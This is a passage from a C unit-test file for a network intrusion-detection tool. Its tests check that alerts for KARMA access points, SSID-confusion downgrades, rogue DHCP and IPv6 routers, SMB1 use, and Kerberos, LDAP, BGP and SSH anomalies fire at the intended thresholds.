    beacon_ap_t *b = &s->beacon_aps[s->beacon_count++];
    memset(b, 0, sizeof(*b));
    memcpy(b->bssid, bssid, 6);
    snprintf(b->enc, sizeof(b->enc), "OPEN");
    int cap = n_ssids < MAX_AP_SSID_HISTORY ? n_ssids : MAX_AP_SSID_HISTORY;
    for (int i = 0; i < cap; i++)
        snprintf(b->ssid_history[i], 33, "%s", ssids[i]);
    b->ssid_history_n = cap;
    if (cap > 0) snprintf(b->ssid, sizeof(b->ssid), "%s", ssids[cap - 1]);
    b->channel    = 6;
    b->signal_dbm = -55;
    b->last_seen  = time(NULL);
}

static void test_karma_three_ssids_fires(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    uint8_t bssid[6] = {0x00,0x11,0x22,0x33,0x44,0x55};
    const char *ssids[] = { "homewifi", "Starbucks", "ACME-Corp" };
    seed_karma_ap(&s, bssid, ssids, 3);
    alerts_update(&s);
    int idx = find_alert(&s, ALERT_TYPE_KARMA_AP);
    ASSERT(idx >= 0);
    ASSERT_EQ((int)s.alerts[idx].sev, (int)ALERT_SEV_CRIT);
}

static void test_karma_two_ssids_no_fire(void) {
    /* Threshold is 3 — two SSIDs is benign (some APs do migrate). */
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    uint8_t bssid[6] = {0x00,0x11,0x22,0x33,0x44,0x55};
    const char *ssids[] = { "homewifi", "homewifi-guest" };
    seed_karma_ap(&s, bssid, ssids, 2);
    alerts_update(&s);
    ASSERT_EQ(find_alert(&s, ALERT_TYPE_KARMA_AP), -1);
}

static void test_karma_one_ssid_no_fire(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    uint8_t bssid[6] = {0x00,0x11,0x22,0x33,0x44,0x55};
    const char *ssids[] = { "homewifi" };
    seed_karma_ap(&s, bssid, ssids, 1);
    alerts_update(&s);
    ASSERT_EQ(find_alert(&s, ALERT_TYPE_KARMA_AP), -1);
}

/* PNL-overlap enrichment (#30): when the KARMA BSSID's advertised SSIDs
 * match SSIDs nearby clients have probed for, the detail names the
 * overlap count — the "beacon-response" evidence. */
static void test_karma_pnl_overlap_in_detail(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    uint8_t bssid[6] = {0x00,0x11,0x22,0x33,0x44,0x55};
    const char *ssids[] = { "homewifi", "Starbucks", "ACME-Corp" };
    seed_karma_ap(&s, bssid, ssids, 3);
    /* A nearby client whose PNL includes two of those SSIDs. */
    pnl_client_t *cli = &s.pnl_clients[s.pnl_count++];
    memset(cli, 0, sizeof(*cli));
    uint8_t cmac[6] = {0x02,0xaa,0xbb,0xcc,0xdd,0xee};
    memcpy(cli->mac, cmac, 6);
    snprintf(cli->ssids[0], 33, "homewifi");
    snprintf(cli->ssids[1], 33, "ACME-Corp");
    cli->ssid_count = 2;
    alerts_update(&s);
    int idx = find_alert(&s, ALERT_TYPE_KARMA_AP);
    ASSERT(idx >= 0);
    ASSERT_EQ((int)s.alerts[idx].sev, (int)ALERT_SEV_CRIT);
    ASSERT(strstr(s.alerts[idx].detail, "2 in client PNLs") != NULL);
}

/* Deauth-then-lure: a KARMA candidate coinciding with a live deauth
 * flood is flagged as an attack chain in progress (#30). */
static void test_karma_deauth_then_lure_in_detail(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    uint8_t bssid[6] = {0x00,0x11,0x22,0x33,0x44,0x55};
    const char *ssids[] = { "homewifi", "Starbucks", "ACME-Corp" };
    seed_karma_ap(&s, bssid, ssids, 3);
    uint8_t victim[6] = {0x02,0xaa,0xbb,0xcc,0xdd,0xee};
    add_deauth_flood(&s, victim);
    s.deauth_events[0].last_seen = time(NULL);   /* live flood */
    alerts_update(&s);
    int idx = find_alert(&s, ALERT_TYPE_KARMA_AP);
    ASSERT(idx >= 0);
    ASSERT(strstr(s.alerts[idx].detail, "deauth-then-lure") != NULL);
}

static void test_karma_stale_deauth_no_chain_note(void) {
    /* A deauth flood well outside the 60s window must not be correlated. */
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    uint8_t bssid[6] = {0x00,0x11,0x22,0x33,0x44,0x55};
    const char *ssids[] = { "homewifi", "Starbucks", "ACME-Corp" };
    seed_karma_ap(&s, bssid, ssids, 3);
    uint8_t victim[6] = {0x02,0xaa,0xbb,0xcc,0xdd,0xee};
    add_deauth_flood(&s, victim);
    s.deauth_events[0].last_seen = time(NULL) - 300;   /* stale */
    alerts_update(&s);
    int idx = find_alert(&s, ALERT_TYPE_KARMA_AP);
    ASSERT(idx >= 0);
    ASSERT(strstr(s.alerts[idx].detail, "deauth-then-lure") == NULL);
}

/* ── SSID Confusion / RSN downgrade (CVE-2023-52424, #32) ── */

/* Like add_beacon but sets the RSN posture fields the downgrade
 * detector keys on. */
static void add_beacon_rsn(sloth_state_t *s, const char *ssid,
                           const uint8_t bssid[6], const char *enc,
                           const char *pairwise, int mfp) {
    add_beacon(s, ssid, bssid, enc);
    beacon_ap_t *b = &s->beacon_aps[s->beacon_count - 1];
    snprintf(b->pairwise, sizeof(b->pairwise), "%s", pairwise);
    b->mfp = mfp;
}

static void test_ssid_confusion_wpa3_to_wpa2_fires(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    uint8_t legit[6] = {0xaa,0xbb,0xcc,0x00,0x00,0x01};
    uint8_t spoof[6] = {0xde,0xad,0xbe,0x00,0x00,0x02};
    add_beacon_rsn(&s, "CORP", legit, "WPA3", "GCMP", 2);   /* SAE, MFP required */
    add_beacon_rsn(&s, "CORP", spoof, "WPA2", "CCMP", 0);   /* PSK, MFP off */
    alerts_update(&s);
    int idx = find_alert(&s, ALERT_TYPE_SSID_CONFUSION);
    ASSERT(idx >= 0);
    ASSERT_EQ((int)s.alerts[idx].sev, (int)ALERT_SEV_CRIT);
}

static void test_ssid_confusion_identical_posture_no_fire(void) {
    /* Legit multi-VAP: same SSID, same RSN posture across BSSIDs. */
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    uint8_t a[6] = {0xaa,0xbb,0xcc,0x00,0x00,0x01};
    uint8_t b[6] = {0xaa,0xbb,0xcc,0x00,0x00,0x02};
    add_beacon_rsn(&s, "CORP", a, "WPA2", "CCMP", 2);
    add_beacon_rsn(&s, "CORP", b, "WPA2", "CCMP", 2);
    alerts_update(&s);
    ASSERT_EQ(find_alert(&s, ALERT_TYPE_SSID_CONFUSION), -1);
}

static void test_ssid_confusion_mfp_drop_fires(void) {
    /* Same generation + cipher, but MFP required -> disabled = +4. */
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    uint8_t legit[6] = {0xaa,0xbb,0xcc,0x00,0x00,0x01};
    uint8_t spoof[6] = {0xde,0xad,0xbe,0x00,0x00,0x02};
    add_beacon_rsn(&s, "CORP", legit, "WPA2", "CCMP", 2);
    add_beacon_rsn(&s, "CORP", spoof, "WPA2", "CCMP", 0);
    alerts_update(&s);
    ASSERT(find_alert(&s, ALERT_TYPE_SSID_CONFUSION) >= 0);
}

static void test_ssid_confusion_enterprise_akm_downgrade_fires(void) {
    /* Same SSID, same enc generation (WPA2), but 802.1X-Enterprise
     * cloned as PSK — the eaphammer rogue-RADIUS lure (#31 sub-signal).
     * The generational check scores 0 here; the AKM check catches it. */
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    uint8_t ent[6]  = {0xaa,0xbb,0xcc,0x00,0x00,0x01};
    uint8_t rogue[6]= {0xde,0xad,0xbe,0x00,0x00,0x02};
    add_beacon_rsn(&s, "CORP-WIFI", ent,   "WPA2", "CCMP", 1);
    add_beacon_rsn(&s, "CORP-WIFI", rogue, "WPA2", "CCMP", 1);
    snprintf(s.beacon_aps[0].akm, sizeof(s.beacon_aps[0].akm), "802.1X");
    snprintf(s.beacon_aps[1].akm, sizeof(s.beacon_aps[1].akm), "PSK");
    alerts_update(&s);
    ASSERT(find_alert(&s, ALERT_TYPE_SSID_CONFUSION) >= 0);
}

static void test_ssid_confusion_enterprise_both_8021x_no_fire(void) {
    /* Legit enterprise multi-VAP: same SSID, both 802.1X. No downgrade. */
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    uint8_t a[6] = {0xaa,0xbb,0xcc,0x00,0x00,0x01};
    uint8_t b[6] = {0xaa,0xbb,0xcc,0x00,0x00,0x02};
    add_beacon_rsn(&s, "CORP-WIFI", a, "WPA2", "CCMP", 1);
    add_beacon_rsn(&s, "CORP-WIFI", b, "WPA2", "CCMP", 1);
    snprintf(s.beacon_aps[0].akm, sizeof(s.beacon_aps[0].akm), "802.1X");
    snprintf(s.beacon_aps[1].akm, sizeof(s.beacon_aps[1].akm), "802.1X");
    alerts_update(&s);
    ASSERT_EQ(find_alert(&s, ALERT_TYPE_SSID_CONFUSION), -1);
}

static void test_ssid_confusion_different_ssid_no_fire(void) {
    /* Downgraded posture but different SSID — not a confusion attack. */
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    uint8_t a[6] = {0xaa,0xbb,0xcc,0x00,0x00,0x01};
    uint8_t b[6] = {0xde,0xad,0xbe,0x00,0x00,0x02};
    add_beacon_rsn(&s, "CORP",  a, "WPA3", "GCMP", 2);
    add_beacon_rsn(&s, "GUEST", b, "WPA2", "CCMP", 0);
    alerts_update(&s);
    ASSERT_EQ(find_alert(&s, ALERT_TYPE_SSID_CONFUSION), -1);
}

static void test_ssid_confusion_open_weak_side_defers_to_twin(void) {
    /* OPEN as the weak side is rule_evil_twin's job, not this rule —
     * the downgrade rule requires the weak side to still be protected. */
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    uint8_t legit[6] = {0xaa,0xbb,0xcc,0x00,0x00,0x01};
    uint8_t spoof[6] = {0xde,0xad,0xbe,0x00,0x00,0x02};
    add_beacon_rsn(&s, "CORP", legit, "WPA3", "GCMP", 2);
    add_beacon_rsn(&s, "CORP", spoof, "OPEN", "",     0);
    alerts_update(&s);
    ASSERT_EQ(find_alert(&s, ALERT_TYPE_SSID_CONFUSION), -1);
    /* ...but the evil-twin rule still catches the OPEN-vs-strong twin. */
    ASSERT(find_alert(&s, ALERT_TYPE_EVIL_TWIN) >= 0);
}

/* ── Management-frame fuzzing (#33) ──────────────────────── */

static beacon_ap_t *add_fuzz_beacon(sloth_state_t *s, const uint8_t bssid[6],
                                    int overruns, int oversize, int trunc_rsn) {
    add_beacon(s, "NetGear", bssid, "WPA2");
    beacon_ap_t *b = &s->beacon_aps[s->beacon_count - 1];
    b->fuzz_ie_overruns   = (uint16_t)overruns;
    b->fuzz_oversize_ssid = (uint16_t)oversize;
    b->fuzz_truncated_rsn = (uint16_t)trunc_rsn;
    return b;
}

static void test_mgmt_fuzz_crit_at_five(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    uint8_t bssid[6] = {0xba,0xad,0xf0,0x0d,0x00,0x01};
    add_fuzz_beacon(&s, bssid, 3, 1, 1);   /* score 5 */
    alerts_update(&s);
    int idx = find_alert(&s, ALERT_TYPE_MGMT_FUZZ);
    ASSERT(idx >= 0);
    ASSERT_EQ((int)s.alerts[idx].sev, (int)ALERT_SEV_CRIT);
}

static void test_mgmt_fuzz_warn_at_three(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    uint8_t bssid[6] = {0xba,0xad,0xf0,0x0d,0x00,0x02};
    add_fuzz_beacon(&s, bssid, 0, 3, 0);   /* score 3 */
    alerts_update(&s);
    int idx = find_alert(&s, ALERT_TYPE_MGMT_FUZZ);
    ASSERT(idx >= 0);
    ASSERT_EQ((int)s.alerts[idx].sev, (int)ALERT_SEV_WARN);
}

static void test_mgmt_fuzz_clean_no_fire(void) {
    /* Well-formed AP — all counters zero, no alert. */
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    uint8_t bssid[6] = {0xba,0xad,0xf0,0x0d,0x00,0x03};
    add_fuzz_beacon(&s, bssid, 0, 0, 0);
    alerts_update(&s);
    ASSERT_EQ(find_alert(&s, ALERT_TYPE_MGMT_FUZZ), -1);
}

static void test_mgmt_fuzz_below_warn_no_fire(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    uint8_t bssid[6] = {0xba,0xad,0xf0,0x0d,0x00,0x04};
    add_fuzz_beacon(&s, bssid, 1, 1, 0);   /* score 2 < WARN */
    alerts_update(&s);
    ASSERT_EQ(find_alert(&s, ALERT_TYPE_MGMT_FUZZ), -1);
}

/* ── Rogue-RADIUS / weak EAP (#31) ───────────────────────── */

static void test_rogue_radius_weak_method_crit(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    rogue_radius_ap_t *r = &s.rogue_radius[s.rogue_radius_count++];
    memset(r, 0, sizeof(*r));
    uint8_t b[6] = {0xde,0xad,0xbe,0xef,0x00,0x01};
    memcpy(r->bssid, b, 6);
    r->weak_method = 1;
    alerts_update(&s);
    int idx = find_alert(&s, ALERT_TYPE_ROGUE_RADIUS);
    ASSERT(idx >= 0);
    ASSERT_EQ((int)s.alerts[idx].sev, (int)ALERT_SEV_CRIT);
}

static void test_rogue_radius_identity_leak_warn(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    rogue_radius_ap_t *r = &s.rogue_radius[s.rogue_radius_count++];
    memset(r, 0, sizeof(*r));
    uint8_t b[6] = {0xde,0xad,0xbe,0xef,0x00,0x02};
    memcpy(r->bssid, b, 6);
    r->identity_leaks = 2;    /* leak only, no weak method */
    alerts_update(&s);
    int idx = find_alert(&s, ALERT_TYPE_ROGUE_RADIUS);
    ASSERT(idx >= 0);
    ASSERT_EQ((int)s.alerts[idx].sev, (int)ALERT_SEV_WARN);
}

static void test_rogue_radius_clean_no_fire(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    rogue_radius_ap_t *r = &s.rogue_radius[s.rogue_radius_count++];
    memset(r, 0, sizeof(*r));
    uint8_t b[6] = {0xde,0xad,0xbe,0xef,0x00,0x03};
    memcpy(r->bssid, b, 6);
    /* PEAP only, no weak method, no leak. */
    r->eap_types_seen = (1u << 25);
    alerts_update(&s);
    ASSERT_EQ(find_alert(&s, ALERT_TYPE_ROGUE_RADIUS), -1);
}

/* ── Rogue DHCP ──────────────────────────────────────────── */

static void add_dhcp_event(sloth_state_t *s, const char *mac,
                            const char *server_ip, uint8_t msg_type) {
    if (s->dhcp_event_count >= MAX_DHCP_EVENTS) return;
    dhcp_event_t *e = &s->dhcp_events[s->dhcp_event_count++];
    memset(e, 0, sizeof(*e));
    snprintf(e->mac,       sizeof(e->mac),       "%s", mac);
    snprintf(e->server_ip, sizeof(e->server_ip), "%s", server_ip);
    e->msg_type  = msg_type;
    e->last_seen = time(NULL);
}

static void test_rogue_dhcp_single_server_no_fire(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    add_dhcp_event(&s, "aa:bb:cc:dd:ee:01", "192.168.1.1", 5 /* ACK */);
    add_dhcp_event(&s, "aa:bb:cc:dd:ee:02", "192.168.1.1", 5);
    alerts_update(&s);
    ASSERT_EQ(find_alert(&s, ALERT_TYPE_ROGUE_DHCP), -1);
}

static void test_rogue_dhcp_two_servers_fires(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    add_dhcp_event(&s, "aa:bb:cc:dd:ee:01", "192.168.1.1",   5);
    add_dhcp_event(&s, "aa:bb:cc:dd:ee:02", "192.168.1.234", 5);   /* rogue */
    alerts_update(&s);
    int idx = find_alert(&s, ALERT_TYPE_ROGUE_DHCP);
    ASSERT(idx >= 0);
    ASSERT_EQ((int)s.alerts[idx].sev, (int)ALERT_SEV_CRIT);
}

static void test_rogue_dhcp_client_requests_dont_count(void) {
    /* Client-side messages (DISCOVER / REQUEST) carry no server_ip;
     * those alone must not trigger the rule. */
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    add_dhcp_event(&s, "aa:bb:cc:dd:ee:01", "", 1 /* DISCOVER */);
    add_dhcp_event(&s, "aa:bb:cc:dd:ee:02", "", 3 /* REQUEST  */);
    alerts_update(&s);
    ASSERT_EQ(find_alert(&s, ALERT_TYPE_ROGUE_DHCP), -1);
}

/* Kills the sort-loop boundary mutations and the key/detail snprintf
 * mutations: detail and key must list servers in stable alphabetical
 * order regardless of observation order. */
static void test_rogue_dhcp_detail_lists_servers_sorted(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    /* Seed in non-alphabetical order to prove the sort runs. */
    add_dhcp_event(&s, "aa:bb:cc:dd:ee:01", "192.168.1.234", 5);
    add_dhcp_event(&s, "aa:bb:cc:dd:ee:02", "10.0.0.1",      5);
    add_dhcp_event(&s, "aa:bb:cc:dd:ee:03", "172.16.0.1",    5);
    alerts_update(&s);
    int idx = find_alert(&s, ALERT_TYPE_ROGUE_DHCP);
    ASSERT(idx >= 0);
    const char *d = s.alerts[idx].detail;
    /* Count is announced first. */
    ASSERT(strstr(d, "3 distinct DHCP servers") != NULL);
    /* All three IPs present. */
    const char *p1 = strstr(d, "10.0.0.1");
    const char *p2 = strstr(d, "172.16.0.1");
    const char *p3 = strstr(d, "192.168.1.234");
    ASSERT(p1 != NULL); ASSERT(p2 != NULL); ASSERT(p3 != NULL);
    /* Sorted: 10.0.0.1 < 172.16.0.1 < 192.168.1.234 by strcmp. */
    ASSERT(p1 < p2);
    ASSERT(p2 < p3);
    /* Dedup key includes the sorted list (drives stable identity). */
    ASSERT(strstr(s.alerts[idx].key, "10.0.0.1,172.16.0.1,192.168.1.234") != NULL);
}

/* Kills the `67` port-literal mutation: the alert must carry the DHCP
 * server port so per-flow pcap export filters the right service. */
static void test_rogue_dhcp_match_port_is_server_port(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    add_dhcp_event(&s, "aa:bb:cc:dd:ee:01", "10.0.0.1",      5);
    add_dhcp_event(&s, "aa:bb:cc:dd:ee:02", "192.168.1.234", 5);
    alerts_update(&s);
    int idx = find_alert(&s, ALERT_TYPE_ROGUE_DHCP);
    ASSERT(idx >= 0);
    ASSERT_EQ((int)s.alerts[idx].match_port, 67);
    /* match_ip is the alphabetically-first server — the operator's pivot. */
    ASSERT_STR(s.alerts[idx].match_ip, "10.0.0.1");
}

/* ── Rogue RA (IPv6) — mirrors the rogue-DHCP rule set ──── */

static void seed_ndp_ra(sloth_state_t *s, const char *src_ip,
                         uint16_t router_lifetime) {
    if (s->ndp_ra_count >= MAX_NDP_RAS) return;
    ndp_ra_event_t *e = &s->ndp_ras[s->ndp_ra_count++];
    memset(e, 0, sizeof(*e));
    snprintf(e->src_ip, sizeof(e->src_ip), "%s", src_ip);
    e->router_lifetime = router_lifetime;
    e->last_seen       = time(NULL);
    e->count           = 1;
}

static void test_rogue_ra_single_router_no_fire(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    seed_ndp_ra(&s, "fe80::1", 1800);
    alerts_update(&s);
    ASSERT_EQ(find_alert(&s, ALERT_TYPE_ROGUE_RA), -1);
}

static void test_rogue_ra_two_routers_fires(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    seed_ndp_ra(&s, "fe80::1",   1800);
    seed_ndp_ra(&s, "fe80::dead", 1800);   /* rogue */
    alerts_update(&s);
    int idx = find_alert(&s, ALERT_TYPE_ROGUE_RA);
    ASSERT(idx >= 0);
    ASSERT_EQ((int)s.alerts[idx].sev, (int)ALERT_SEV_CRIT);
}

/* router_lifetime == 0 means "I'm not a default router" — those
 * advertisers must not count toward the rogue threshold even if
 * multiple of them are present (a "router" with lifetime 0 is just
 * a host saying "ignore me for routing"). */
static void test_rogue_ra_zero_lifetime_dont_count(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    seed_ndp_ra(&s, "fe80::1",   1800);
    seed_ndp_ra(&s, "fe80::a",   0);
    seed_ndp_ra(&s, "fe80::b",   0);
    alerts_update(&s);
    ASSERT_EQ(find_alert(&s, ALERT_TYPE_ROGUE_RA), -1);
}

static void test_rogue_ra_detail_lists_routers_sorted(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    /* Seed in non-alphabetical order to prove the sort runs. */
    seed_ndp_ra(&s, "fe80::ffff", 1800);
    seed_ndp_ra(&s, "fe80::1",    1800);
    seed_ndp_ra(&s, "fe80::aaaa", 1800);
    alerts_update(&s);
    int idx = find_alert(&s, ALERT_TYPE_ROGUE_RA);
    ASSERT(idx >= 0);
    const char *d = s.alerts[idx].detail;
    ASSERT(strstr(d, "3 distinct IPv6 routers") != NULL);
    const char *p1 = strstr(d, "fe80::1");
    const char *p2 = strstr(d, "fe80::aaaa");
    const char *p3 = strstr(d, "fe80::ffff");
    ASSERT(p1 != NULL); ASSERT(p2 != NULL); ASSERT(p3 != NULL);
    ASSERT(p1 < p2);
    ASSERT(p2 < p3);
    ASSERT(strstr(s.alerts[idx].key,
                  "fe80::1,fe80::aaaa,fe80::ffff") != NULL);
    /* match_ip is the alphabetically-first router. */
    ASSERT_STR(s.alerts[idx].match_ip, "fe80::1");
}

/* Kills the dup-detection on the router-IP collection loop: same
 * router observed twice (e.g. as two RA frames in the same poll)
 * must count as one router. */
static void test_rogue_ra_dedup_same_router(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    for (int i = 0; i < 5; i++) seed_ndp_ra(&s, "fe80::1", 1800);
    alerts_update(&s);
    ASSERT_EQ(find_alert(&s, ALERT_TYPE_ROGUE_RA), -1);
}

/* ── SMB1 use ───────────────────────────────────────────── */

static void seed_smb_session(sloth_state_t *s, const char *client_ip,
                              const char *server_ip, uint16_t server_port,
                              const char *dialect) {
    if (s->smb_session_count >= MAX_SMB_SESSIONS) return;
    smb_session_t *e = &s->smb_sessions[s->smb_session_count++];
    memset(e, 0, sizeof(*e));
    snprintf(e->client_ip, sizeof(e->client_ip), "%s", client_ip);
    snprintf(e->server_ip, sizeof(e->server_ip), "%s", server_ip);
    e->server_port = server_port;
    snprintf(e->dialect, sizeof(e->dialect), "%s", dialect);
    e->last_seen = time(NULL);
    e->count     = 3;
}

static void test_smb1_use_fires_on_smb1_session(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    seed_smb_session(&s, "10.0.0.5", "10.0.0.10", 445, "SMB1");
    alerts_update(&s);
    int idx = find_alert(&s, ALERT_TYPE_SMB1_USE);
    ASSERT(idx >= 0);
    ASSERT_EQ((int)s.alerts[idx].sev, (int)ALERT_SEV_CRIT);
    ASSERT_STR(s.alerts[idx].match_ip, "10.0.0.10");
    ASSERT_EQ((int)s.alerts[idx].match_port, 445);
    ASSERT(strstr(s.alerts[idx].detail, "SMBv1") != NULL);
    ASSERT(strstr(s.alerts[idx].detail, "10.0.0.5")  != NULL);
    ASSERT(strstr(s.alerts[idx].detail, "10.0.0.10") != NULL);
}

static void test_smb1_use_no_fire_on_smb2(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    seed_smb_session(&s, "10.0.0.5", "10.0.0.10", 445, "SMB2");
    alerts_update(&s);
    ASSERT_EQ(find_alert(&s, ALERT_TYPE_SMB1_USE), -1);
}

/* Each distinct (client, server, port) gets its own alert so an
 * operator can pivot to the specific endpoint pair that needs the
 * SMBv1 disable / patch. */
static void test_smb1_use_separate_alert_per_session(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    seed_smb_session(&s, "10.0.0.5", "10.0.0.10", 445, "SMB1");
    seed_smb_session(&s, "10.0.0.6", "10.0.0.11", 139, "SMB1");
    alerts_update(&s);
    int count = 0;
    for (int k = 0; k < s.alert_count; k++) {
        if (s.alerts[k].type == ALERT_TYPE_SMB1_USE) count++;
    }
    ASSERT_EQ(count, 2);
}

/* ── Kerberos preauth burst ─────────────────────────────── */

static void seed_kerb_event(sloth_state_t *s, const char *src_ip,
                             int preauth_failed_count) {
    if (s->kerb_event_count >= MAX_KERB_EVENTS) return;
    kerb_event_t *e = &s->kerb_events[s->kerb_event_count++];
    memset(e, 0, sizeof(*e));
    snprintf(e->src_ip, sizeof(e->src_ip), "%s", src_ip);
    e->preauth_failed_count = preauth_failed_count;
    e->last_seen = time(NULL);
}

/* The rule's threshold is 5 — fire at exactly 5. */
static void test_kerb_preauth_burst_fires_at_threshold(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    seed_kerb_event(&s, "10.0.0.5", 5);
    alerts_update(&s);
    int idx = find_alert(&s, ALERT_TYPE_KERB_PREAUTH_BURST);
    ASSERT(idx >= 0);
    ASSERT_EQ((int)s.alerts[idx].sev, (int)ALERT_SEV_CRIT);
    ASSERT_STR(s.alerts[idx].match_ip, "10.0.0.5");
    ASSERT_EQ((int)s.alerts[idx].match_port, 88);
    ASSERT(strstr(s.alerts[idx].detail, "5 Kerberos pre-auth") != NULL);
}

static void test_kerb_preauth_burst_below_threshold_no_fire(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    seed_kerb_event(&s, "10.0.0.5", 4);
    alerts_update(&s);
    ASSERT_EQ(find_alert(&s, ALERT_TYPE_KERB_PREAUTH_BURST), -1);
}

/* Each spraying source gets its own alert — pivots cleanly. */
static void test_kerb_preauth_burst_per_source(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    seed_kerb_event(&s, "10.0.0.5", 8);
    seed_kerb_event(&s, "10.0.0.6", 12);
    alerts_update(&s);
    int count = 0;
    for (int k = 0; k < s.alert_count; k++) {
        if (s.alerts[k].type == ALERT_TYPE_KERB_PREAUTH_BURST) count++;
    }
    ASSERT_EQ(count, 2);
}

/* ── LDAP search flood ──────────────────────────────────── */

static void seed_ldap_event(sloth_state_t *s, const char *src_ip,
                             int search_count) {
    if (s->ldap_event_count >= MAX_LDAP_EVENTS) return;
    ldap_event_t *e = &s->ldap_events[s->ldap_event_count++];
    memset(e, 0, sizeof(*e));
    snprintf(e->src_ip, sizeof(e->src_ip), "%s", src_ip);
    e->search_count = search_count;
    e->last_seen    = time(NULL);
}

static void test_ldap_search_flood_fires_at_threshold(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    seed_ldap_event(&s, "10.0.0.5", 50);
    alerts_update(&s);
    int idx = find_alert(&s, ALERT_TYPE_LDAP_SEARCH_FLOOD);
    ASSERT(idx >= 0);
    ASSERT_EQ((int)s.alerts[idx].sev, (int)ALERT_SEV_CRIT);
    ASSERT_STR(s.alerts[idx].match_ip, "10.0.0.5");
    ASSERT_EQ((int)s.alerts[idx].match_port, 389);
    ASSERT(strstr(s.alerts[idx].detail, "50 LDAP") != NULL);
}

static void test_ldap_search_flood_below_threshold_no_fire(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    seed_ldap_event(&s, "10.0.0.5", 49);
    alerts_update(&s);
    ASSERT_EQ(find_alert(&s, ALERT_TYPE_LDAP_SEARCH_FLOOD), -1);
}

static void test_ldap_search_flood_per_source(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    seed_ldap_event(&s, "10.0.0.5", 100);
    seed_ldap_event(&s, "10.0.0.6", 75);
    alerts_update(&s);
    int count = 0;
    for (int k = 0; k < s.alert_count; k++) {
        if (s.alerts[k].type == ALERT_TYPE_LDAP_SEARCH_FLOOD) count++;
    }
    ASSERT_EQ(count, 2);
}

/* ── BGP NOTIFICATION burst ─────────────────────────────── */

static void seed_bgp_session(sloth_state_t *s, const char *peer_a,
                              const char *peer_b, int notif_count) {
    if (s->bgp_session_count >= MAX_BGP_SESSIONS) return;
    bgp_session_t *e = &s->bgp_sessions[s->bgp_session_count++];
    memset(e, 0, sizeof(*e));
    snprintf(e->peer_a, sizeof(e->peer_a), "%s", peer_a);
    snprintf(e->peer_b, sizeof(e->peer_b), "%s", peer_b);
    e->notification_count = notif_count;
    e->last_seen          = time(NULL);
}

static void test_bgp_notification_burst_fires_at_threshold(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    seed_bgp_session(&s, "10.0.0.1", "10.0.0.2", 3);
    alerts_update(&s);
    int idx = find_alert(&s, ALERT_TYPE_BGP_NOTIFICATION_BURST);
    ASSERT(idx >= 0);
    ASSERT_EQ((int)s.alerts[idx].sev, (int)ALERT_SEV_CRIT);
    ASSERT_STR(s.alerts[idx].match_ip, "10.0.0.1");
    ASSERT_EQ((int)s.alerts[idx].match_port, 179);
    ASSERT(strstr(s.alerts[idx].detail, "3 BGP NOTIFICATION") != NULL);
}

static void test_bgp_notification_burst_below_threshold_no_fire(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    seed_bgp_session(&s, "10.0.0.1", "10.0.0.2", 2);
    alerts_update(&s);
    ASSERT_EQ(find_alert(&s, ALERT_TYPE_BGP_NOTIFICATION_BURST), -1);
}

static void test_bgp_notification_burst_per_peer_pair(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    seed_bgp_session(&s, "10.0.0.1", "10.0.0.2", 5);
    seed_bgp_session(&s, "10.0.0.3", "10.0.0.4", 4);
    alerts_update(&s);
    int count = 0;
    for (int k = 0; k < s.alert_count; k++) {
        if (s.alerts[k].type == ALERT_TYPE_BGP_NOTIFICATION_BURST) count++;
    }
    ASSERT_EQ(count, 2);
}

/* ── SSH brute force ────────────────────────────────────── */

static void seed_ssh_flow(sloth_state_t *s, const char *src_ip,
                           const char *dst_ip, int banner_count) {
    if (s->ssh_flow_count >= MAX_SSH_FLOWS) return;
    ssh_flow_t *e = &s->ssh_flows[s->ssh_flow_count++];
    memset(e, 0, sizeof(*e));
    snprintf(e->src_ip, sizeof(e->src_ip), "%s", src_ip);
    snprintf(e->dst_ip, sizeof(e->dst_ip), "%s", dst_ip);
    snprintf(e->server_banner, sizeof(e->server_banner),
             "SSH-2.0-OpenSSH_8.9");
    e->banner_count = banner_count;
    e->last_seen    = time(NULL);
}

static void test_ssh_brute_force_fires_at_threshold(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    seed_ssh_flow(&s, "10.0.0.5", "10.0.0.10", 10);
    alerts_update(&s);
